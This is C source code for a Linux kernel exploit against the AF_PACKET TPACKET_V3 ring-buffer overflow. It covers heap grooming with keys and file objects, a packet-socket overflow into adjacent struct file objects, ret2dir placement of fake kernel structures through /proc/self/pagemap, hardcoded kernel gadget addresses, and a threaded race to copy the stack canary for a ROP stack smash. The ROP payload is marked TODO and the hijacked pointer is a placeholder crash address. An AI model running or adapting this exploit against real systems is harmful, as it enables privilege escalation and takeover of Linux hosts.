#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <stdarg.h>
#include <stdbool.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sched.h>

#include <sys/ioctl.h>
#include <sys/klog.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>

#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <linux/ip.h>
#include <linux/udp.h>
#include <netinet/if_ether.h>
#include <net/if.h>
#include <keyutils.h>
#include <pthread.h>

// packet_sock->xmit
#define XMIT_OFFSET	1296
#define __ALIGN_KERNEL_MASK(x, mask)	(((x) + (mask)) & ~(mask))
#define __ALIGN_KERNEL(x, a)		__ALIGN_KERNEL_MASK(x, (typeof(x))(a) - 1)
#define ALIGN(x, a)			__ALIGN_KERNEL((x), (a))

#define V3_ALIGNMENT	(8)
#define BLK_HDR_LEN	(ALIGN(sizeof(struct tpacket_block_desc), V3_ALIGNMENT))

#define ETH_HDR_LEN	sizeof(struct ethhdr)

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12
#define CRASH_ADDR 0xffffffffdeadbeef

// for rop
#define PAYLOAD_ADDR 0x40002000
#define PAYLOAD_OFFSET (PAGE_SIZE - 0x50)

struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb8];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};

struct kernel_param {
    char hole1[0x10];
    void *ops;
    char hole2[0x8];
    void *arg;
};

struct kernel_param_ops {
    char hole1[0x10];
    uint64_t rdx; // void* get
    void* free;
};

struct fetch_param {
    void* fn;
    char hole1[0x8];
};

struct deref_fetch_param {
    struct fetch_param orig;
    char hole1[0x18];
};

struct irqaction {
    void* handle;
    void* dev_id;
    char hole[0x70];
};

struct irq_desc {
    char hole1[0x68];
    struct irqaction* action;
    char hole2[0x110];
};

int fd[128];
struct file fake_file;

void init_packet_socket_rx_ring(int s, unsigned int block_size,
		unsigned int frame_size, unsigned int block_nr,
		unsigned int sizeof_priv, unsigned int timeout) {
	// specify using TPACKET_V3 version cause this vulnerability
	// only impacts this verison
	int v = TPACKET_V3;
	int rv = setsockopt(s, SOL_PACKET, PACKET_VERSION, &v, sizeof(v));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_VERSION)");
		exit(EXIT_FAILURE);
	}

	struct tpacket_req3 req;
	memset(&req, 0, sizeof(req));
	req.tp_block_size = block_size;
	req.tp_frame_size = frame_size;
	req.tp_block_nr = block_nr;
	req.tp_frame_nr = (block_size * block_nr) / frame_size;
	req.tp_retire_blk_tov = timeout;
	req.tp_sizeof_priv = sizeof_priv;
	req.tp_feature_req_word = 0;
	
	// vulnerability happens in this system call
	rv = setsockopt(s, SOL_PACKET, PACKET_RX_RING, &req, sizeof(req));
	if (rv < 0) {
		perror("[-] setsockopt(PACKET_RX_RING)");
		exit(EXIT_FAILURE);
	}
}

int setup_packet_socket_buffer(unsigned int block_size, unsigned int frame_size,
		unsigned int block_nr, unsigned int sizeof_priv, int timeout) {
	// create a AF_PACKET socket
	int s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (s < 0) {
		perror("[-] socket(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	init_packet_socket_rx_ring(s, block_size, frame_size, block_nr,
		sizeof_priv, timeout);

	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_family = PF_PACKET;
	sa.sll_protocol = htons(ETH_P_ALL);
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_hatype = 0;
	sa.sll_pkttype = 0;
	sa.sll_halen = 0;

	int rv = bind(s, (struct sockaddr *)&sa, sizeof(sa));
	if (rv < 0) {
		perror("[-] bind(AF_PACKET)");
		exit(EXIT_FAILURE);
	}

	return s;
}

void send_packet(int s, char *buffer, int size) {
	struct sockaddr_ll sa;
	memset(&sa, 0, sizeof(sa));
	sa.sll_ifindex = if_nametoindex("lo");
	sa.sll_halen = ETH_ALEN;

	if (sendto(s, buffer, size, 0, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		perror("[-] sendto(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}
}

int exhaust_kmalloc_256() {
    int i = 0;
    char type[5] = "user";
    char* description = (char*)malloc(sizeof(char)*4);
    char* payload = (char*)malloc(sizeof(char)*0x100-0x18); // 256
    memset(payload, 'A', 0x100-0x18-0x1);
    for (i = 0; i < 512 ; i++) {
        key_serial_t key;
        sprintf(description, "%d", i);
        key = add_key(type, description, payload, strlen(payload), KEY_SPEC_USER_KEYRING);
        if (key == -1) {
            perror("add_key");
            exit(0);
        }
    }
}

int kmalloc_file() {
	int i = 0;
	char filename[10];
	memset(filename, 0, 10);
	for (i = 0; i < 128; i++) {
		sprintf(filename, "test%d", i);
		fd[i] = open(filename, O_WRONLY | O_CREAT);
		if (fd[i] < 0) {
			perror("alloc_file\n");
			return -1;
		}
	}
	return 0;
}

int hijack_lseek(void* kaddr) {
	int i = 0;
	// overflow will occupy some bytes of the file object
	// right before victim file object which makes it 
	// fragile. Therefore, we lseek inversely
	printf("trying to hijack control flow\n");
	for (i = 127; i >= 0; i--) {
		lseek(fd[i], (uint64_t)(kaddr +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc) +
                sizeof(struct irqaction)), SEEK_SET);
		usleep(1000);
	}
	return 0;
}

int kmalloc_packet_sock(){
	int s = socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ARP));
	if (s == -1) {
		perror("[-] socket(SOCK_DGRAM)");
		exit(EXIT_FAILURE);
	}
	return s;
}

bool write_file2(const char* file, const char* what, ...) {
	char buf[1024];
	va_list args;
	va_start(args, what);
	vsnprintf(buf, sizeof(buf), what, args);
	va_end(args);
	buf[sizeof(buf) - 1] = 0;
	int len = strlen(buf);

	int fd = open(file, O_WRONLY | O_CLOEXEC);
	if (fd == -1)
		return false;
	if (write(fd, buf, len) != len) {
		close(fd);
		return false;
	}
	close(fd);
	return true;
}

void setup_sandbox2() {
	int real_uid = getuid();
	int real_gid = getgid();

	if (unshare(CLONE_NEWUSER) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}
	
	if (unshare(CLONE_NEWNET) != 0) {
		perror("[-] unshare(CLONE_NEWUSER)");
		exit(EXIT_FAILURE);
	}

	if (!write_file2("/proc/self/setgroups", "deny")) {
		perror("[-] write_file(/proc/self/set_groups)");
		exit(EXIT_FAILURE);
	}
	if (!write_file2("/proc/self/uid_map", "0 %d 1\n", real_uid)){
		perror("[-] write_file(/proc/self/uid_map)");
		exit(EXIT_FAILURE);
	}
	if (!write_file2("/proc/self/gid_map", "0 %d 1\n", real_gid)) {
		perror("[-] write_file(/proc/self/gid_map)");
		exit(EXIT_FAILURE);
	}

	cpu_set_t my_set;
	CPU_ZERO(&my_set);
	CPU_SET(0, &my_set);
	if (sched_setaffinity(0, sizeof(my_set), &my_set) != 0) {
		perror("[-] sched_setaffinity()");
		exit(EXIT_FAILURE);
	}

	if (system("/sbin/ifconfig lo up") != 0) {
		perror("[-] system(/sbin/ifconfig lo up)");
		exit(EXIT_FAILURE);
	}
}

// | ... | 0x10 | stack canary | saved register | rop |
void* copy_stack_canary(void* arg) {
    void* paddr = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET);
    // prepare payload
    // TODO

    // copy_to_user stack canary address
    uint64_t* canary_addr = (uint64_t*)(USER_ADDR +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc) +
            sizeof(struct irqaction) +
            sizeof(struct deref_fetch_param) +
            0xc);

    // copy_from_user stack canary address
    uint64_t* new_canary_addr = (uint64_t*)(paddr + 0x10);
    int i = 0;

    while(true) {
        *new_canary_addr =  *canary_addr;
    }
}

// | file_operations | kernel_param_ops *4 | irq_desc | irqaction | deref_fetch_param |
void construct_malicious_data(void* kaddr) {
    memset(&fake_file, 0x00, sizeof(struct file));
    fake_file.f_op = kaddr;
    fake_file.f_mode = 0x5801e;

    // hijack control flow to destroy_params to fork
    struct file_operations fake_file_operations;
    //fake_file_operations.llseek = (void*)0xffffffff8107b710;
    fake_file_operations.llseek = (void*)CRASH_ADDR;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
    memcpy((void*)USER_ADDR, &fake_file_operations, sizeof(struct file_operations));

    // embed kernel_param array in file
    struct kernel_param* fake_kernel_param = (struct kernel_param*)&fake_file;

    // kernel_param 1
    fake_kernel_param->ops = (void*)(kaddr +
            sizeof(struct file_operations));
    // control RDI for copy_to_user's dest
    // stack canary address is
    // RDI + 0xc
    fake_kernel_param->arg = (void*)(USER_ADDR +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc) +
            sizeof(struct irqaction) +
            sizeof(struct deref_fetch_param));

    // kernel_param 2
    fake_kernel_param = (struct kernel_param*)((char*)&fake_file +
            sizeof(struct kernel_param));
    // -10 because it used to be f_count in struct file
    // thread makes it +1
    fake_kernel_param->ops = (void*)(kaddr +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops) - 10);

    // kernel_param 3
    fake_kernel_param = (struct kernel_param*)((char*)&fake_file +
            sizeof(struct kernel_param)*2);
    fake_kernel_param->ops = (void*)(kaddr +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*2);
    fake_kernel_param->arg = ((void*)(kaddr +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*2));

    // kernel_param 4
    fake_kernel_param = (struct kernel_param*)((char*)&fake_file +
            sizeof(struct kernel_param)*3);
    fake_kernel_param->ops = (void*)(kaddr +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*3);
    fake_kernel_param->arg = ((void*)(kaddr +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*4));

    // fork1 to fetch_deref_string_size so as to
    // 1. construct fake stack
    // 2. invoke indirect call to copy_to_user gadget in e1000_ioctl
    struct kernel_param_ops fake_kernel_param_ops1;
    fake_kernel_param_ops1.free = (void*)0xffffffff8111fc60;
    memcpy((void*)(USER_ADDR + sizeof(struct file_operations)),
            &fake_kernel_param_ops1, sizeof(struct kernel_param_ops));

    // fork2 to directly return
    struct kernel_param_ops fake_kernel_param_ops2;
    fake_kernel_param_ops2.free = (void*)0xffffffff8107b74b;
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)),
            &fake_kernel_param_ops2, sizeof(struct kernel_param_ops));

    // fork3 to bloom RDX control for stack smash
    struct kernel_param_ops fake_kernel_param_ops3;
    fake_kernel_param_ops3.free = (void*)0xffffffff8170fd5a; // ROP
    fake_kernel_param_ops3.rdx = 0x70; // RDX
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*2),
            &fake_kernel_param_ops3, sizeof(struct kernel_param_ops));

    // fork4 to __handle_irq_event_percpu to
    // 1. first bloom RSI control
    // 2. invoke indirect call to copy_from_user to smash stack
    struct kernel_param_ops fake_kernel_param_ops4;
    fake_kernel_param_ops4.free = (void*)0xffffffff810ac720;
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*3),
            &fake_kernel_param_ops4, sizeof(struct kernel_param_ops));

    // in __handle_irq_event_percpu
    struct irq_desc fake_irq_desc;
    fake_irq_desc.action = (void*)(kaddr +
            sizeof(struct file_operations) +
            sizeof(struct kernel_param_ops)*4 +
            sizeof(struct irq_desc));
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*4),
            &fake_irq_desc, sizeof(struct irq_desc));

    struct irqaction fake_irqaction;
    // invoke indirect call in input_event_from_user so as to copy_from_user
    fake_irqaction.handle = (void*)0xffffffff81692f75;
    fake_irqaction.dev_id = (void*)(PAYLOAD_ADDR + PAYLOAD_OFFSET); // RSI
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc)),
            &fake_irqaction, sizeof(struct irqaction));

    struct deref_fetch_param fake_deref_fetch_param;
    // invoke indirect call in e1000_ioctl so as to copy_to_user
    fake_deref_fetch_param.orig.fn = (void*)0xffffffff81625fe0;
    memcpy((void*)(USER_ADDR +
                sizeof(struct file_operations) +
                sizeof(struct kernel_param_ops)*4 +
                sizeof(struct irq_desc) +
                sizeof(struct irqaction)),
            &fake_deref_fetch_param, sizeof(struct deref_fetch_param));
    return;
}

void setup_roppayload() {
	void* addr = (void*)PAYLOAD_ADDR;
    void* raddr = NULL;
    munmap(addr, PAGE_SIZE);
    raddr = mmap(addr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        pthread_exit(raddr);
    }
    memset(raddr, 'B', PAGE_SIZE);
}

void* setup_dir() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
        goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        uint64_t kaddr = 0;
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
				construct_malicious_data((void*)kaddr);
    }
err:
	close(fd);
    return ret;
}

int main() {
	//setup_sandbox();
	setup_roppayload();
	void* dir_addr = setup_dir();

	int s = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
	if (s == -1) {
		perror("[-] socket(SOCK_RAW)");
		exit(EXIT_FAILURE);
	}

	/* 
	 *  create 512 keys to exhaust kmalloc-256 cache which uses 0x4000 slabs
	 */
	exhaust_kmalloc_256();

	/* 
	 *  drain the page allocator freelists and
	 *  cause some high-order page block to be splited
	 *  create a packet socket and attach a ring buffer with 0x1000
	 *  blocks of size 0x1000 and frame size as 0x200
	 */
	setup_packet_socket_buffer(0x1000, 0x200, 0x1000, 0, 100);

	/* 
	 *  create a packet socket and attach a ring buffer 
	 *  with 2 blocks of size 0x8000 and frame size as 2048
	 *  the second block is used to overflow
	 */
	int offset = 0x100;
	unsigned int maclen = ETH_HDR_LEN;
	unsigned int netoff = TPACKET_ALIGN(TPACKET3_HDRLEN +
				(maclen < 16 ? 16 : maclen));
	// macoff = 0x52 get added in tpacket_rcv() -> skb_copy_bits()
	unsigned int macoff = netoff - maclen;

	// BLK_HDR_LEN = 48 is the length of tpacket_block_desc
	// which is at the beginning of block
	unsigned int sizeof_priv = (1u<<31) + (1u<<30) +
		0x1000 - BLK_HDR_LEN - macoff + offset; // 0xc0008c56

	//getchar();
	setup_packet_socket_buffer(0x1000, 0x200, 2, sizeof_priv, 100);
	/*
	 *  open files to allocate file structures and 
	 *  cause allocation of at least one new slab which is right after 
	 *  the second block
	 */
	kmalloc_file();

	/*
	 * cause overflow 
	 */
	send_packet(s, (char*)&fake_file + 2, sizeof(struct file) - 2);

	/*
	 * hijack control flow
	 */
	int i = 0;
	pthread_t th_arr[10];
	for (i = 0; i < 10; i++) 
		pthread_create(&th_arr[i], NULL, copy_stack_canary, NULL);

	hijack_lseek(dir_addr);

	//while(1);
	return 0;
}
